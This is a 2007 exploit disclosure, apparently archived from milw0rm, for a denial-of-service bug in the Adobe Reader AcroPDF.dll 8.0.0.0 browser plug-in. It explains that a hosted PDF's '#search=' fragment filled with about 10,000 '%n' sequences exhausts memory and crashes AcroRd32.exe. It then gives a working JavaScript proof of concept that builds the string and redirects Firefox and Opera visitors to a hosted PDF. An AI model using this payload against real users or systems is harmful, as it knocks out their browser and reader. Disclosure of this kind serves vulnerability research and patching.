<html><head><title>Adobe Reader plug-in AcroPDF.dll 8.0.0.0 Resource Consumption</title></head><pre>&lt;!--------------------------------------------------------------------------------
Adobe PDF Reader plug-in AcroPDF.dll ver. 8.0.0.0 Resource Consumption
author: shinnai
mail: shinnai[at]autistici[dot]org
site: http://www.shinnai.altervista.org

Well, Adobe guys do a good job after the publication of a variety of
bug in AcroPDF.dll, one for all

From Secunia:
&quot;Input passed to a hosted PDF file is not properly sanitised by the
  browser plug-in before being returned to users. This can be exploited
  to execute arbitrary script code in a user's browser session in context
  of an affected site.&quot;

So now the dll is able to understand when you're trying to insert something
wrong prompting you with &quot;One or more of the query terms are too long.&quot;
and that's a good thing but... I thought &quot;can this dll sanitise chars like 
%n&quot;
Well the answer is: no.

Unfortunately (sure depends by the point of view) Internet Explorer is
not useful for a test 'cause a limited number of chars (only 2083) is 
admitted
in the address bar, so we need to use browser like Firefox and stuff like
that.
When you browse to a hosted pdf file like this
http://somesite/poc.pdf#search=%n%n%n... x 10000 (or much more if you like)
the browse will stop to answer until the process AcroRd32.exe crashes,
the CPU usage is about 50-60% and the paging file usage grow until
it's full and you have the message &quot;Insufficient virtual memory...&quot;
Here's a proof of concept, for online demonstration see:
http://www.shinnai.altervista.org/adobe.html

txt version here: http://www.shinnai.altervista.org/txt/adobe.txt
--------------------------------------------------------------------------------&gt;

&lt;script language=&quot;javascript&quot;&gt;
var browserName=navigator.appName;

if (browserName==&quot;Netscape&quot;)
{var f = &quot;&quot;
var c = &quot;&quot;
  for (var i = 0; i &lt;= 10000; i++) {
   var f = f + &quot;%n&quot;;
  }
document.location = &quot;http://www.shinnai.altervista.org/pucca.pdf#search=&quot; + 
(f)
}
else if (browserName=='Opera')
{var f = &quot;&quot;
var c = &quot;&quot;
  for (var i = 0; i &lt;= 10000; i++) {
   var f = f + &quot;%n&quot;;
  }
document.location = &quot;http://www.shinnai.altervista.org/pucca.pdf#search=&quot; + 
(f)
}
else if (browserName=='Microsoft Internet Explorer')
{
alert(&quot;This exploit doesn't work with IE. You need to use Firefox and stuff 
like that.&quot;);
document.location=&quot;http://www.shinnai.altervista.org&quot;;
}
else
{
alert(&quot;Mmm... I don't know what are you browsing with here, so no martini no 
party.&quot;);
}
&lt;/script&gt;

# milw0rm.com [2007-03-08]</pre></html>